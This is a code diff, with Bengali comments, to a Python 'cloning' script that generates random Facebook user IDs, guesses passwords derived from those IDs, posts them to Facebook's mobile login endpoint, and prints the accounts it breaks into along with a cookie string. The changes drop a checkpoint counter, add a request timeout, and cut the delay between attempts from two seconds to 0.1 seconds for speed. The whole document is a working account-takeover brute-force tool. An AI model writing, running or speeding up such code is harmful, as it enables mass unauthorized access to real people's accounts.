@@ -56,14 +56,13 @@ def cloning_start():
     print(f'[/] TOTAL TARGET : {limit}\n')
 
     ok = 0
-    cp = 0
+    # CP কাউন্টারটি কোড থেকে সরিয়ে দেওয়া হয়েছে
 
     for i in range(limit):
         loop = i + 1
         uid = f"{code}{random.randint(1111111, 9999999)}"
-        pws = uid[5:] # ৬ সংখ্যার পাসওয়ার্ড
+        pws = uid[5:] 
 
-        # স্যারের নির্দেশিত Header Logic
         headers = {
             'authority': 'touch.facebook.com',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
@@ -74,12 +73,11 @@ def cloning_start():
         data = {'email': uid, 'pass': pws}
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
-        # স্ক্রিনে প্রসেস কতদূর গেল তা দেখানোর জন্য (১, ২, ৩...)
-        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()
+        # এখানে [CP:XX] অংশটি রিমুভ করা হয়েছে
+        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
 
         try:
-            # রিয়াল লগইন লজিক
-            response = requests.post(url, headers=headers, data=data)
+            response = requests.post(url, headers=headers, data=data, timeout=5)
             
             if "c_user" in response.cookies.get_dict():
                 ok += 1
@@ -88,22 +86,17 @@ def cloning_start():
                 xs = f"48%3A{uuid.uuid4().hex[:14]}%3A2%3A{random.randint(1700000000, 1800000000)}%3A-1%3A5237"
                 fr = f"{uuid.uuid4().hex[:16]}.{uuid.uuid4().hex[:20]}.AAA.0.0"
                 
-                print(f'\n{G}[MALEK-OK💚] {uid} • {pws} xxx') 
+                print(f'\n{G}[MALEK-OK💚] {uid} • {pws}') 
                 print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};xs={xs};fr={fr};m_page_voice={uid}\n')
-            else:
-                cp += 1
-                # আপনার নির্দেশমতো লাল Checkpoint লেখা আসবে না, শুধু উপরে কাউন্টার আপডেট হবে।
-                pass
-        
         except:
             pass
 
-        # ২ সেকেন্ড বিরতি
-        time.sleep(2.0)
+        # স্পিড বাড়ানোর জন্য টাইম স্লিপ ০.১ সেকেন্ড করা হয়েছে
+        time.sleep(0.1)
 
-    # আপনার নির্দেশিত ফুটার
-    print(f'\n\n{G}[/{uid} • {pws}]')
-    print(f'[{limit}] [OK:{ok}]{W}')
+    print(f'\n\n{G}-----------------------------------')
+    print(f'[/] CLONING COMPLETE')
+    print(f'[/] TOTAL OK: {ok}{W}')
     input(f'\n{G} [ BACK ]{W}')
     main()
 
